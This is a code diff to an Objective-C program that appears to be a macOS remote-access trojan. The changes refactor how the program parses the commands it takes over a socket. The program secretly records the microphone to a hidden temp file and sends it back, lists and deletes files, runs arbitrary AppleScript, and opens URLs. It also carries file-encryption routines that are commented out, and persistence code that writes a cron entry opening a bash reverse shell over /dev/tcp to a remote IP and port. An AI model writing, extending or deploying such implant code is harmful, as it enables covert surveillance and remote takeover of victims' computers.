@@ -93,18 +93,27 @@ int sockfd;
 }
 
 -(void)liveSendString:(NSString *)string {
-    NSString *finalstr = [NSString stringWithFormat:@"%@%@",[escryptor encryptNSStringToB64:self.skey :string],_liveterminator];
+    NSMutableString *reversed = [NSMutableString string];
+    NSInteger charIndex = [_terminator length];
+    while (charIndex > 0) {
+        charIndex--;
+        NSRange subRange = NSMakeRange(charIndex, 1);
+        [reversed appendString:[_terminator substringWithRange:subRange]];
+    }
+
+    NSString *finalstr = [NSString stringWithFormat:@"%@%@",
+                          [escryptor encryptNSStringToB64:self.skey :string],reversed];
     write (sockfd, [finalstr UTF8String], finalstr.length + 11);
 }
 
 //MARK: Mic
 
--(void)mic:(NSArray *)args {
+-(void)mic:(NSString *)arg {
     NSString *usage = @"Usage: mic [record|stop]";
-    if (args.count == 1) {
+    if ([arg isEqualToString:@""]) {
         [self sendString:usage];
     }
-    else if ([args[1] isEqualToString:@"record"]) {
+    else if ([arg isEqualToString:@"record"]) {
         if ([self recordAudio]) {
             [self sendString:@"Listening..."];
         }
@@ -112,7 +121,7 @@ int sockfd;
             [self sendString:@"Already Recording"];
         }
     }
-    else if ([args[1] isEqualToString:@"stop"]) {
+    else if ([arg isEqualToString:@"stop"]) {
         if ([self stopAudio]) {
             [self download:[[NSArray alloc] initWithObjects:@"download",@"/tmp/.avatmp", nil]];
         }
@@ -259,13 +268,13 @@ int sockfd;
 
 //MARK: File Management
 
--(void)directoryList:(NSArray *)args {
+-(void)directoryList:(NSString *)arg {
     //basically "ls"
     printf("directory listing %s\n",[_skey UTF8String]);
     NSArray *files;
     NSString *dir = [fileManager currentDirectoryPath];
-    if (args.count > 1) {
-        dir = [self forgetFirst:args];
+    if (![arg isEqualToString:@""]) {
+        dir = arg;
     }
     
     BOOL isdir = false;
@@ -364,12 +373,9 @@ int sockfd;
     }
 }
 
--(void)rmFile:(NSArray *)args {
+-(void)rmFile:(NSString *)arg {
     NSString *file = @"";
-    if (args.count > 1) {
-        file = [self forgetFirst:args];
-    }
-    else {
+    if ([arg isEqualToString:@""]) {
         [self sendString:@"Usage: rm filename"];
         return;
     }
@@ -410,8 +416,9 @@ int sockfd;
     }
 }
 
+/* we will come back to this
 
--(void)encryptFile:(NSArray *)args {
+-(void)encryptFile:(NSString *)arg {
     BOOL isdir;
     NSString *filepath = @"";
     if (args.count > 2) {
@@ -441,7 +448,7 @@ int sockfd;
     }
 }
 
--(void)decryptFile:(NSArray *)args {
+-(void)decryptFile:(NSString *)arg {
     BOOL isdir;
     NSString *filepath = @"";
     if (args.count > 2) {
@@ -476,6 +483,7 @@ int sockfd;
         [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
     }
 }
+*/
 
 -(void)receiveFile:(NSString *)saveToPath {
     //GLOBAL
@@ -616,8 +624,8 @@ int sockfd;
     [self sendString:contents];
 }
 
--(void)set_brightness:(NSArray *)args {
-    if (!(args.count > 1)) {
+-(void)set_brightness:(NSString *)arg {
+    if ([arg isEqualToString:@""]) {
         [self sendString:@"Usage: brightness 0.x"];
         return;
     }
@@ -645,7 +653,7 @@ int sockfd;
                                         &brightness);
 
         
-        IODisplaySetFloatParameter(service, kNilOptions, kDisplayBrightness, [args[1] floatValue]);
+        IODisplaySetFloatParameter(service, kNilOptions, kDisplayBrightness, [arg floatValue]);
     }
     [self blank];
 
@@ -668,6 +676,19 @@ int sockfd;
     [self sendFile:imageData];
 }
 
+-(void)setVolume:(NSString *)arg {
+    NSAppleScript* asdown = [[NSAppleScript alloc] initWithSource:@"output volume of (get volume settings)"];
+    NSAppleEventDescriptor *result = [asdown executeAndReturnError:nil];
+    
+    NSAppleScript* asdown2 = [[NSAppleScript alloc] initWithSource:[NSString stringWithFormat: @"set volume output volume (%@ - 6.25)", [result stringValue]]];
+}
+-(void)getVolume {
+    NSAppleScript* asdown = [[NSAppleScript alloc] initWithSource:@"output volume of (get volume settings)"];
+    NSAppleEventDescriptor *result = [asdown executeAndReturnError:nil];
+    
+    NSAppleScript* asdown2 = [[NSAppleScript alloc] initWithSource:[NSString stringWithFormat: @"set volume output volume (%@ - 6.25)", [result stringValue]]];
+}
+
 -(void)removePersistence:(NSString *)ip
                         :(NSString *)port {
     NSString *persist = [NSString stringWithFormat:@"* * * * * bash &> /dev/tcp/%@/%@ 0>&1\n",ip,port];
@@ -688,12 +709,12 @@ int sockfd;
     [self sendString:@""];
 }
 
--(void)openURL:(NSArray *)cmdarray {
-    if (cmdarray.count == 1) {
+-(void)openURL:(NSString *)arg {
+    if ([arg isEqualToString:@""]) {
         [self sendString:@"Usage: openurl http://example.com"];
         return;
     }
-    NSURL *url = [NSURL URLWithString:cmdarray[1]];
+    NSURL *url = [NSURL URLWithString:arg];
     [[NSWorkspace sharedWorkspace] openURL:url];
     [self blank];
 }
@@ -734,8 +755,8 @@ int sockfd;
     });
 }
 
--(void)runAppleScript:(NSArray *)cmdarray {
-    NSAppleScript *aps = [[NSAppleScript alloc] initWithSource:[self forgetFirst:cmdarray]];
+-(void)runAppleScript:(NSString *)arg {
+    NSAppleScript *aps = [[NSAppleScript alloc] initWithSource:arg];
     NSError *error;
     [aps executeAndReturnError:&error];
     if (error == NULL) {
@@ -808,6 +829,17 @@ int sockfd;
     }
     
     return ( [result copy] );
+}
+
++ (NSString *)reverseString:(NSString *)str {
+    NSMutableString *reversed = [NSMutableString string];
+    NSInteger charIndex = [str length];
+    while (charIndex > 0) {
+        charIndex--;
+        NSRange subRange = NSMakeRange(charIndex, 1);
+        [reversed appendString:[str substringWithRange:subRange]];
+    }
+    return reversed;
 }
 
 @end
